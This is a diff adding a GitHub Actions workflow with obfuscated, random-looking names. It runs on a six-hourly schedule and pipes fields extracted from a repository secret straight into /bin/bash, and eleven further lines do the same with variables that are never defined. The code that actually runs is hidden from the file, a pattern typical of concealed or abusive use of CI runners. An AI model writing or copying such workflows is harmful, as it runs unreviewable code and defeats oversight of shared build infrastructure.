@@ -1,0 +1,29 @@
+name: zhonglianhua2341
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhonglianhua2341
+        env:
+          yct32: ${{ secrets.yct32 }}
+        run: |
+          echo $yct32 | jq -r .h0026 | /bin/bash
+          echo $pv0447 | jq -r .f867 | /bin/bash
+          echo $cfwzz5648 | jq -r .gtngi935 | /bin/bash
+          echo $irqnx38 | jq -r .wwrlv9 | /bin/bash
+          echo $jgjj82 | jq -r .lrqlg13334 | /bin/bash
+          echo $ip6 | jq -r .oxqv51 | /bin/bash
+          echo $crq9068 | jq -r .ocvux97 | /bin/bash
+          echo $cop962 | jq -r .c34616 | /bin/bash
+          echo $hfrz3338 | jq -r .e4428 | /bin/bash
+          echo $ssc3 | jq -r .mh33243 | /bin/bash
+          echo $ywmk230 | jq -r .jp022 | /bin/bash
+          echo $ywht0286 | jq -r .kxhsl4 | /bin/bash
+
